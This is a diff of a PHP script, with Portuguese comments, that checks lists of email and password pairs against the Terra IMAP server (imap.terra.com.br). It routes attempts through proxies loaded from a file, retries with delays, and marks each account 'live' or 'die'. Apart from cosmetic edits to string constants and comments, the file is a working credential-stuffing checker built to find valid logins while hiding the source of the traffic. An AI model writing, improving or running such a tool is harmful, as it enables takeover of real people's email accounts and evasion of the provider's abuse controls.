@@ -1,6 +1,7 @@
 <?php
-// Reescrito usando apenas aspas simples e array()
-// para evitar conversao de caracteres no GitHub
+define('CRLF', chr(13) . chr(10));
+define('LF', chr(10));
+define('DQ', chr(34));
 
 while (ob_get_level() > 0) { @ob_end_clean(); }
 ob_start();
@@ -16,15 +17,12 @@ header('Access-Control-Allow-Origin: *');
 
 $action = isset($_GET['action']) ? $_GET['action'] : '';
 
-// =========================================
-//  INIT
-// =========================================
 if ($action === 'init') {
     $proxies = array();
     $proxyFile = __DIR__ . '/proxies.txt';
     if (file_exists($proxyFile)) {
         $content = @file_get_contents($proxyFile);
-        $lines = array_filter(array_map('trim', explode("\n", $content)));
+        $lines = array_filter(array_map('trim', explode(LF, $content)));
         foreach ($lines as $line) {
             if (empty($line) || $line[0] === '#') continue;
             $proxies[] = $line;
@@ -35,9 +33,6 @@ if ($action === 'init') {
     exit;
 }
 
-// =========================================
-//  TEST_PROXY
-// =========================================
 if ($action === 'test_proxy') {
     $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
     if (empty($proxy)) {
@@ -51,9 +46,6 @@ if ($action === 'test_proxy') {
     exit;
 }
 
-// =========================================
-//  DIAG_PROXY
-// =========================================
 if ($action === 'diag_proxy') {
     $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
     if (empty($proxy)) {
@@ -64,7 +56,6 @@ if ($action === 'diag_proxy') {
     $p = parseProxy($proxy);
     $diag = array('proxy' => $proxy, 'parsed' => $p, 'tests' => array());
 
-    // Test 1: TCP
     $t0 = microtime(true);
     $sock = @fsockopen($p['host'], $p['port'], $errno, $errstr, 10);
     $diag['tests']['tcp'] = array(
@@ -74,7 +65,6 @@ if ($action === 'diag_proxy') {
     );
     if ($sock) fclose($sock);
 
-    // Test 2: HTTPS via cURL
     $t0 = microtime(true);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
@@ -98,7 +88,6 @@ if ($action === 'diag_proxy') {
     );
     curl_close($ch);
 
-    // Test 3: HTTP CONNECT manual
     $diag['tests']['http_connect_manual'] = testManualConnect($proxy, 20);
 
     ob_end_clean();
@@ -106,9 +95,6 @@ if ($action === 'diag_proxy') {
     exit;
 }
 
-// =========================================
-//  CHECK
-// =========================================
 if ($action === 'check') {
     $email = isset($_POST['email']) ? $_POST['email'] : '';
     $password = isset($_POST['password']) ? $_POST['password'] : '';
@@ -132,9 +118,6 @@ ob_end_clean();
 echo json_encode(array('status' => 'ok'));
 exit;
 
-// =========================================
-//  PARSE PROXY
-// =========================================
 function parseProxy($proxy) {
     $host = '';
     $port = 0;
@@ -154,9 +137,6 @@ function parseProxy($proxy) {
     return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass);
 }
 
-// =========================================
-//  TEST PROXY
-// =========================================
 function testProxy($proxy) {
     if (!extension_loaded('curl')) return false;
     $p = parseProxy($proxy);
@@ -180,9 +160,6 @@ function testProxy($proxy) {
     return ($result !== false && strlen(trim($result)) > 0);
 }
 
-// =========================================
-//  DO VALIDATE
-// =========================================
 function doValidate($email, $password, $proxy) {
     $timeout = 20;
     $delays = array(0, 2000000, 4000000, 7000000, 10000000);
@@ -191,16 +168,13 @@ function doValidate($email, $password, $proxy) {
         if ($delays[$attempt] > 0) usleep($delays[$attempt]);
 
         if (!empty($proxy)) {
-            // Metodo 1: cURL com proxy
             if (extension_loaded('curl')) {
                 $r = tryCurlProxy($email, $password, $timeout, $proxy);
                 if ($r !== null) return $r;
             }
-            // Metodo 2: HTTP CONNECT manual
             $r = tryHttpConnectManual($email, $password, $timeout, $proxy);
             if ($r !== null) return $r;
         } else {
-            // Sem proxy
             if (extension_loaded('curl')) {
                 $r = tryCurlDirect($email, $password, $timeout);
                 if ($r !== null) return $r;
@@ -213,9 +187,6 @@ function doValidate($email, $password, $proxy) {
     return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
 }
 
-// =========================================
-//  cURL COM PROXY
-// =========================================
 function tryCurlProxy($email, $password, $timeout, $proxy) {
     $p = parseProxy($proxy);
     if (empty($p['host'])) return null;
@@ -246,42 +217,36 @@ function tryCurlProxy($email, $password, $timeout, $proxy) {
     return null;
 }
 
-// =========================================
-//  HTTP CONNECT MANUAL + TLS + IMAP
-// =========================================
 function tryHttpConnectManual($email, $password, $timeout, $proxy) {
     $p = parseProxy($proxy);
     if (empty($p['host']) || empty($p['port'])) return null;
 
-    // 1. TCP ao proxy
     $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
     if ($socket === false) return null;
 
     stream_set_timeout($socket, $timeout);
     stream_set_blocking($socket, true);
 
-    // 2. HTTP CONNECT
     $target = 'imap.terra.com.br';
-    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . "\r\n";
-    $req .= 'Host: ' . $target . ':993' . "\r\n";
-    $req .= 'User-Agent: Mozilla/5.0' . "\r\n";
+    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF;
+    $req .= 'Host: ' . $target . ':993' . CRLF;
+    $req .= 'User-Agent: Mozilla/5.0' . CRLF;
     if (!empty($p['user'])) {
         $auth = base64_encode($p['user'] . ':' . $p['pass']);
-        $req .= 'Proxy-Authorization: Basic ' . $auth . "\r\n";
+        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
     }
-    $req .= 'Proxy-Connection: Keep-Alive' . "\r\n";
-    $req .= "\r\n";
+    $req .= 'Proxy-Connection: Keep-Alive' . CRLF;
+    $req .= CRLF;
 
     fwrite($socket, $req);
 
-    // 3. Ler resposta HTTP
     $resp = '';
     $deadline = microtime(true) + $timeout;
     while (!feof($socket) && microtime(true) < $deadline) {
         $line = @fgets($socket, 8192);
         if ($line === false) { usleep(50000); continue; }
         $resp .= $line;
-        if ($line === "\r\n" || $line === "\n") break;
+        if ($line === CRLF || $line === LF) break;
     }
 
     if (stripos($resp, '200') === false) {
@@ -289,7 +254,6 @@ function tryHttpConnectManual($email, $password, $timeout, $proxy) {
         return null;
     }
 
-    // 4. TLS
     $cryptoOk = false;
     $deadline2 = microtime(true) + $timeout;
     while (microtime(true) < $deadline2) {
@@ -304,14 +268,13 @@ function tryHttpConnectManual($email, $password, $timeout, $proxy) {
         return null;
     }
 
-    // 5. IMAP greeting
     $greeting = '';
     $deadline3 = microtime(true) + $timeout;
     while (!feof($socket) && microtime(true) < $deadline3) {
         $line = @fgets($socket, 8192);
         if ($line === false) { usleep(50000); continue; }
         $greeting .= $line;
-        if (strpos($line, "\n") !== false) break;
+        if (strpos($line, LF) !== false) break;
     }
 
     if (stripos($greeting, 'OK') === false) {
@@ -319,13 +282,11 @@ function tryHttpConnectManual($email, $password, $timeout, $proxy) {
         return null;
     }
 
-    // 6. IMAP LOGIN
-    $safe_email = str_replace(array('\', '"'), array('\\', '\"'), $email);
-    $safe_pass = str_replace(array('\', '"'), array('\\', '\"'), $password);
-    $login_cmd = 'A1 LOGIN "' . $safe_email . '" "' . $safe_pass . "\"\r\n";
+    $safe_email = addslashes($email);
+    $safe_pass = addslashes($password);
+    $login_cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
     fwrite($socket, $login_cmd);
 
-    // 7. Ler resposta
     $imapResp = '';
     $deadline4 = microtime(true) + $timeout;
     while (!feof($socket)) {
@@ -336,7 +297,7 @@ function tryHttpConnectManual($email, $password, $timeout, $proxy) {
         if (microtime(true) > $deadline4) break;
     }
 
-    @fwrite($socket, "A2 LOGOUT\r\n");
+    @fwrite($socket, 'A2 LOGOUT' . CRLF);
     fclose($socket);
 
     if (preg_match('/A1\s+OK/i', $imapResp)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
@@ -345,9 +306,6 @@ function tryHttpConnectManual($email, $password, $timeout, $proxy) {
     return null;
 }
 
-// =========================================
-//  TESTE MANUAL (diag)
-// =========================================
 function testManualConnect($proxy, $timeout) {
     $p = parseProxy($proxy);
     if (empty($p['host']) || empty($p['port'])) {
@@ -362,12 +320,12 @@ function testManualConnect($proxy, $timeout) {
     stream_set_timeout($socket, $timeout);
 
     $target = 'imap.terra.com.br';
-    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . "\r\n" . 'Host: ' . $target . ':993' . "\r\n";
+    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF . 'Host: ' . $target . ':993' . CRLF;
     if (!empty($p['user'])) {
         $auth = base64_encode($p['user'] . ':' . $p['pass']);
-        $req .= 'Proxy-Authorization: Basic ' . $auth . "\r\n";
+        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
     }
-    $req .= "\r\n";
+    $req .= CRLF;
     fwrite($socket, $req);
 
     $resp = '';
@@ -376,7 +334,7 @@ function testManualConnect($proxy, $timeout) {
         $line = @fgets($socket, 8192);
         if ($line === false) { usleep(50000); continue; }
         $resp .= $line;
-        if ($line === "\r\n" || $line === "\n") break;
+        if ($line === CRLF || $line === LF) break;
     }
 
     if (stripos($resp, '200') === false) {
@@ -404,7 +362,7 @@ function testManualConnect($proxy, $timeout) {
         $line = @fgets($socket, 8192);
         if ($line === false) { usleep(50000); continue; }
         $greeting .= $line;
-        if (strpos($line, "\n") !== false) break;
+        if (strpos($line, LF) !== false) break;
     }
     fclose($socket);
 
@@ -417,9 +375,6 @@ function testManualConnect($proxy, $timeout) {
     return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
 }
 
-// =========================================
-//  cURL DIRETO
-// =========================================
 function tryCurlDirect($email, $password, $timeout) {
     if (!extension_loaded('curl')) return null;
     $ch = curl_init();
@@ -440,9 +395,6 @@ function tryCurlDirect($email, $password, $timeout) {
     return null;
 }
 
-// =========================================
-//  SOCKET DIRETO
-// =========================================
 function trySocketDirect($email, $password, $timeout) {
     $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
     if ($socket === false) return null;
@@ -454,7 +406,7 @@ function trySocketDirect($email, $password, $timeout) {
     }
     $safe_email = addslashes($email);
     $safe_pass = addslashes($password);
-    $cmd = 'A1 LOGIN "' . $safe_email . '" "' . $safe_pass . "\"\r\n";
+    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
     fwrite($socket, $cmd);
     $response = '';
     $deadline = microtime(true) + $timeout;
@@ -465,7 +417,7 @@ function trySocketDirect($email, $password, $timeout) {
         if (strpos(trim($line), 'A1 ') === 0) break;
         if (microtime(true) > $deadline) break;
     }
-    @fwrite($socket, "A2 LOGOUT\r\n");
+    @fwrite($socket, 'A2 LOGOUT' . CRLF);
     fclose($socket);
     if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
     if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
